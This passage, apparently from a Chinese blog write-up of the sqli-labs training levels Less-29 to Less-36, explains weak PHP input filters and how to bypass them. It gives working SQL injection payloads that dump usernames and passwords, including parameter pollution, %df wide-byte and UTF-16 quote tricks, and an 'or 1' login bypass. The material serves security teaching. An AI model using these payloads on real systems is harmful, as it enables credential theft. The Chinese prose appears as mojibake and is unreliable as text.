interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> æŸ¥è¯¢åˆ°ç»“æœ<span class="token punctuation">:</span>    è¾“å‡ºæŸ¥è¯¢çš„è¯¦ç»†ä¿¡æ¯<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span><span class="token keyword">function</span> <span class="token function-definition function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$query_string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$q_s</span> <span class="token operator">=</span> <span class="token variable">$query_string</span><span class="token punctuation">;</span>    <span class="token comment"># &amp; ä½œä¸ºåˆ†éš”ç¬¦ åˆ†å‰²å­—ç¬¦ä¸²</span>    <span class="token variable">$qs_array</span><span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token variable">$q_s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment"># éå† qs_array æ•°ç»„</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$qs_array</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token variable">$val</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment"># å¦‚æœæ•°ç»„å‰ä¸¤ä½æ˜¯ id çš„è¯</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token operator">==</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token comment"># æˆªå– $value çš„3-30 çš„å­—ç¬¦ä¸² ä½œä¸º id çš„å€¼ </span>            <span class="token variable">$id_value</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token variable">$id_value</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment"># è¿‡æ»¤è§„åˆ™ æ£€æµ‹æ•°å­—</span>    <span class="token variable">$match</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^\d+$/"</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> ä¸ç¬¦åˆè§„åˆ™ï¼š        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: hacked.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ä»£ç ä¸­è¿˜æ˜¯å¾ˆå®¹æ˜“å‘ç°é—®é¢˜çš„ï¼Œå…³é”®é—®é¢˜å‡ºåœ¨ä¸‹é¢çš„åœ°æ–¹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$id1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>whitelist<span class="token string backtick-quoted-string">` è¿‡æ»¤æ˜¯æ¯”è¾ƒä¸¥æ ¼çš„ï¼Œå¦‚æœ id ä¸æ˜¯æ•°å­—çš„è¯å°±ä¼šç›´æ¥é‡å®šå‘åˆ° `</span>hacked<span class="token operator">.</span>php<span class="token string backtick-quoted-string">`ï¼Œè¿™é‡Œæ˜¯æ²¡æ¯›ç—…çš„ã€‚é‚£ä¹ˆé—®é¢˜å‡ºåœ¨äº†è¿™é‡Œå‡½æ•°`</span><span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸º return è¡¨ç¤ºäº†å‡½æ•°çš„ç»“æŸè¿è¡Œï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°æ•æ‰åˆ° id çš„æ—¶å€™å°±ä¼šè¿”å› <code>return $id_value</code>ï¼Œè¿™æ ·å°±å¯¼è‡´äº† ç”¨æˆ·åŠ å…¥æ„é€ ä¸¤ç»„ id çš„è¯ï¼Œé‚£ä¹ˆåé¢çš„ id å°±ä¼šç»•è¿‡å‡½æ•°æ£€æµ‹ã€‚</p><p>å‡è®¾ç”¨æˆ·è¾“å…¥è¿™æ ·çš„è¯­å¥ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Apache PHP ä¼šè§£ææœ€åä¸€ä¸ªå‚æ•°</p><p>Tomcat JSP ä¼šè§£æç¬¬ä¸€ä¸ªå‚æ•°</p><p>çŸ¥é“è¿™ä¸ªåŸç†çš„è¯åé¢å°è¯•ç›´æ¥æ³¨å…¥å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>å’Œ Less-29 ç›¸æ¯”æ²¡æœ‰å•¥æœ¬è´¨å˜åŒ–ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ã€‚</p><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=ï¼ˆ&quot;$id&quot;ï¼‰</code></td></tr></tbody></table><p>å’Œ Less-29 ç›¸æ¯”æ²¡æœ‰å•¥æœ¬è´¨å˜åŒ–ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ã€‚</p><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>è€ƒå¯Ÿ Bypass addslashes()ï¼Œå…³é”®çš„é˜²æŠ¤ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># åœ¨' " \ ç­‰æ•æ„Ÿå­—ç¬¦å‰é¢æ·»åŠ åæ–œæ </span><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment"># \ è½¬æ¢ä¸º \\</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\\\\"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          å°†       <span class="token comment"># å°† ' è½¬ä¸º\"</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment"># å°† " è½¬ä¸º\"</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\"/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\""</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å®½å­—èŠ‚æ³¨å…¥åŸç†</strong></p><p>MySQL åœ¨ä½¿ç”¨ GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚ <code>%aa%5c</code> å°±æ˜¯ä¸€ä¸ª æ±‰å­—ã€‚å› ä¸ºè¿‡æ»¤æ–¹æ³•ä¸»è¦å°±æ˜¯åœ¨æ•æ„Ÿå­—ç¬¦å‰é¢æ·»åŠ  åæ–œæ  <code>\</code>ï¼Œæ‰€ä»¥è¿™é‡Œæƒ³åŠæ³•å¹²æ‰åæ–œæ å³å¯ã€‚</p><ol><li><code>%df</code> åƒæ‰ <code>\</code></li></ol><p>å…·ä½“çš„åŸå› æ˜¯ <code>urlencode(\&#39;) = %5c%27</code>ï¼Œæˆ‘ä»¬åœ¨<code>%5c%27</code> å‰é¢æ·»åŠ <code>%df</code>ï¼Œå½¢ æˆ<code>%df%5c%27</code>ï¼ŒMySQL åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œè¿™ä¸ªæ—¶å€™å°±æŠŠ<code>%df%5c</code> å½“åšæ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ<code>%27</code> åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚</p><ol><li>å°† <code>\&#39;</code> ä¸­çš„ <code>\</code> è¿‡æ»¤æ‰</li></ol><p>ä¾‹å¦‚å¯ä»¥æ„é€  <code>%5c%5c%27</code> çš„æƒ…å†µï¼Œåé¢çš„<code>%5c</code>ä¼šè¢«å‰é¢çš„<code>%5c</code> ç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯ bypass çš„ä¸€ç§æ–¹æ³•ã€‚</p><p>æœ¬å…³å¡é‡‡ç”¨ç¬¬ä¸€ç§ %df å®½å­—èŠ‚æ³¨å…¥æ¥åƒæ‰åæ–œæ ï¼Œä¸‹é¢ç›´æ¥ä¸¢ payload å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>æ‹¼æ¥æ–¹å¼ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œè¿‡æ»¤æ–¹æ³•ç»†èŠ‚æœ‰ç‚¹å˜åŒ–ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$string</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>addslashes()</code> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p><table><thead><tr><th align="left">é¢„å®šä¹‰å­—ç¬¦</th><th align="left">è½¬ä¹‰å</th></tr></thead><tbody><tr><td align="left"><code>\</code></td><td align="left"><code>\\</code></td></tr><tr><td align="left"><code>&#39;</code></td><td align="left"><code>\&#39;</code></td></tr><tr><td align="left"><code>&quot;</code></td><td align="left"><code>\&quot;</code></td></tr></tbody></table><p>è¯¥å‡½æ•°å¯ç”¨äºä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ï¼Œå’Œ Less-32 çš„å‡½æ•°åŠŸèƒ½æ˜¯å·®ä¸çš„ï¼Œä¾æ—§å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚è¿›è¡Œæ³¨å…¥ã€‚</p><blockquote><p>æ³¨å…¥å¤©ä¹¦ï¼šä½¿ç”¨ addslashes(),æˆ‘ä»¬éœ€è¦å°† mysql_query è®¾ç½®ä¸º binary çš„æ–¹å¼ï¼Œæ‰èƒ½é˜²å¾¡æ­¤æ¼æ´</p></blockquote><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>è¿‡æ»¤æ–¹æ³•ä¾ç„¶å’Œ Less-33 ä¸€è‡´ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åªæ˜¯ç”± GET å‹å˜æˆäº† POST å‹ï¼Œæ‰€ä»¥ä¸‹é¢ç›´æ¥ä¸¢ POST çš„æ•°æ®åŒ… payload äº†ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin%df&#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;233<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>MySQL æ³¨å…¥å¤©ä¹¦è¿™é‡Œä»‹ç»äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•</p><p>å°† utf-8 è½¬æ¢ä¸º utf-16 æˆ– utf-32ï¼Œä¾‹å¦‚å°† <code>&#39;</code> è½¬ä¸º utf-16 ä¸º<code>ï¿½</code></p><p>æˆ‘ä»¬å°± å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹å¼è¿›è¡Œå°è¯•ï¼Œå¯ä»¥ä½¿ç”¨ Linux è‡ªå¸¦çš„ iconv å‘½ä»¤è¿›è¡Œ UTF çš„ç¼–ç è½¬æ¢ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">âœ  ~ <span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>'<span class="token operator">|</span><span class="token function">iconv</span> -f utf-8 -t utf-16ï¿½ï¿½<span class="token string">'âœ  ~ echo \'</span><span class="token operator">|</span><span class="token function">iconv</span> -f utf-8 -t utf-32ï¿½ï¿½'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆå°è¯•ä¸€ä¸ªç»å…¸çš„ä¸‡èƒ½å¯†ç ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;ï¿½&#39; or 1#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ºä»€ä¹ˆè¿™ä¸ªä¸‡èƒ½å¯†ç å¯ä»¥ç”Ÿæ•ˆå‘¢ï¼Œå› ä¸ºæ‹¼æ¥åˆ° SQL ä¸­æ˜¯å¦‚ä¸‹çš„æ•ˆæœï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'ï¿½'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#and password='$passwd' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>or 1</code> æ˜¯ä¸€ä¸ªæ°¸çœŸçš„æ¡ä»¶ï¼Œä¸è®º select é€‰æ‹©å‡ºçš„å†…å®¹æ˜¯ä»€ä¹ˆã€‚<code>or 1</code> ä¹‹åæ—¶é’Ÿéƒ½æ˜¯ 1ï¼Œä¸‹é¢æ˜¯æ§åˆ¶åå°çš„æ¼”ç¤ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># where username = 'x' or 1</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'x'</span> or <span class="token number">1</span><span class="token punctuation">;</span>+----+---------------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>+----+---------------+------------+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> Dumb          <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> Angelina      <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> Dummy         <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> secure        <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> stupid        <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> superman      <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">7</span> <span class="token operator">|</span> batman        <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin         <span class="token operator">|</span> <span class="token number">233</span>        <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">9</span> <span class="token operator">|</span> admin1        <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> admin2        <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> admin3        <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> dhakkan       <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">14</span> <span class="token operator">|</span> admin4        <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">21</span> <span class="token operator">|</span> admin<span class="token string">'#hacker | 111        |+----+---------------+------------+14 rows in set (0.00 sec)# where username = '</span>x<span class="token string">' or 0mysql> select * from users where username = '</span>x<span class="token string">' or 0;Empty set (0.00 sec)# where 1mysql> select * from users where 1;+----+---------------+------------+| id | username      | password   |+----+---------------+------------+|  1 | Dumb          | Dumb       ||  2 | Angelina      | I-kill-you ||  3 | Dummy         | p@ssword   ||  4 | secure        | crappy     ||  5 | stupid        | stupidity  ||  6 | superman      | genious    ||  7 | batman        | mob!le     ||  8 | admin         | 233        ||  9 | admin1        | admin1     || 10 | admin2        | admin2     || 11 | admin3        | admin3     || 12 | dhakkan       | dumbo      || 14 | admin4        | admin4     || 21 | admin'</span><span class="token comment">#hacker | 111        |</span>+----+---------------+------------+<span class="token number">14</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="token comment"># where 0</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token number">0</span><span class="token punctuation">;</span>Empty <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆç›´æ¥å°è¯•ä¸€ä¸‹æœ€åŸºæœ¬çš„è”åˆæŸ¥è¯¢æ³¨å…¥çœ‹çœ‹ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;ï¿½&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿæ˜¯ OK çš„</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>Less-35 çš„é˜²æŠ¤æªæ–½æœ‰ç‚¹æç¬‘ï¼Œé¦–å…ˆ id ä½¿ç”¨äº†å¦‚ä¸‹è§„åˆ™è¿‡æ»¤ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯æœ¬å…³çš„æ‹¼æ¥æ–¹å¼æ˜¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®é™…è¿›è¡Œæ³¨å…¥åˆ©ç”¨çš„æ—¶å€™å¹¶ä¸éœ€è¦å†™å•å¼•å·ï¼Œé‚£ä¹ˆå°±å°è¯•ç›´æ¥æ³¨å…¥çœ‹çœ‹å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>ä¸»è¦é˜²æŠ¤ä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_quotes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check_quotes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$string</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€å…³ä¸»è¦è€ƒæŸ¥äº† Bypass MySQL Real Escape Stringï¼Œmysql_real_escape_string 